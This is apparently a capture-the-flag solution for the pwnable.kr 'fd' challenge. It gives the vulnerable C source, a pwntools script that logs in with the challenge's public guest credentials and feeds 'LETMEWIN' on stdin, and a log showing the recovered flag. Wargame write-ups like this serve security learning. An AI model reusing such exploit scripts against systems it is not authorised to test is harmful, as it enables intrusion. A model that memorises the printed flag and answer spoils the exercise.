''' 
Description:

    Mommy! what is a file descriptor in Linux?
    ssh fd@pwnable.kr -p2222 (pw:guest)

Source fd.c:

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    char buf[32];
    int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
            printf("pass argv[1] a number\n");
            return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
            printf("good job :)\n");
            system("/bin/cat flag");
            exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;
    }

Solution

Solver:
'''

from pwn import *

user    = 'fd'
passwd  = 'guest'
host    = 'pwnable.kr'
port    =  2222
command = 'echo "LETMEWIN" | ./fd 4660'

s = ssh(user, host, port, passwd)
flag, status = s.run_to_end(command)
print '[+] Flag:', flag.rstrip()
s.close()

'''
Log:

[+] Connecting to pwnable.kr on port 2222: Done
[+] Flag: mommy! I think I know what a file descriptor is!!
good job :)
[*] Closed connection to 'pwnable.kr'
'''
